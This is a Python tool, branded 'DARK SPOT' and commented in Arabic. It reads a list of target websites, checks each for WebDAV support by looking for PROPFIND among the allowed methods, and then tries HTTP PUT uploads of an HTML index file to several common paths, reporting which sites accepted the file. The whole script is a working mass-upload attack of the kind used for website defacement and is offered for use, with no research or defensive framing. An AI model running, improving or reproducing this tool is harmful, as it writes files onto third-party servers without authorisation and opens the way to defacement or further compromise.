import requests
from pyfiglet import Figlet
from tabulate import tabulate
from colorama import Fore, Style, init

# تهيئة colorama
init(autoreset=True)

# الإعدادات
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # يمكنك إضافة المزيد من User Agents هنا
]

HEADERS = {
    "User-Agent": USER_AGENTS[0]
}

# طباعة العنوان باستخدام pyfiglet
def print_banner():
    f = Figlet(font='slant')
    print(Fore.CYAN + f.renderText('DARK SPOT'))

# قراءة المواقع من ملف
def read_targets_file(file_path):
    try:
        with open(file_path, 'r') as file:
            targets = [line.strip() for line in file if line.strip()]
        return targets
    except FileNotFoundError:
        print(Fore.RED + f"Error: The file '{file_path}' was not found.")
        return []

# فحص إذا كان الموقع به ثغرة WebDav
def check_webdav_vulnerability(url):
    try:
        response = requests.options(url, headers=HEADERS)
        if 'Allow' in response.headers and 'PROPFIND' in response.headers['Allow']:
            return True
        return False
    except requests.RequestException:
        return False

# رفع ملف إلى موقع به ثغرة WebDav
def upload_index_file(url, index_name):
    try:
        # طرق مختلفة لرفع الملف
        upload_urls = [
            f"{url}/{index_name}",
            f"{url}/webdav/{index_name}",
            f"{url}/uploads/{index_name}",
            f"{url}/files/{index_name}",
            f"{url}/index/{index_name}"
        ]
        
        for upload_url in upload_urls:
            response = requests.put(upload_url, data='<html><body><h1>WebDav Index</h1></body></html>', headers=HEADERS)
            if response.status_code == 201 or response.status_code == 200:
                return upload_url  # إرجاع عنوان URL الذي تم رفع الملف عليه
        return None
    except requests.RequestException:
        return None

# تنفيذ الأداة
def main():
    print_banner()
    
    targets_file = 'Targets.txt'
    index_name = input(Fore.YELLOW + "Enter the name of the index file to upload (e.g., index.html): ").strip()
    targets = read_targets_file(targets_file)
    
    if not targets:
        print(Fore.RED + "No targets found. Exiting.")
        return
    
    results = []

    for site in targets:
        if check_webdav_vulnerability(site):
            upload_url = upload_index_file(site, index_name)
            if upload_url:
                results.append([Fore.GREEN + site, Fore.GREEN + f"File Uploaded to {upload_url}"])

    if results:
        print(tabulate(results, headers=[Fore.BLUE + "Site", Fore.BLUE + "Status"], tablefmt="grid"))
    else:
        print(Fore.RED + "No sites were found where the index file was successfully uploaded.")

if __name__ == "__main__":
    main()
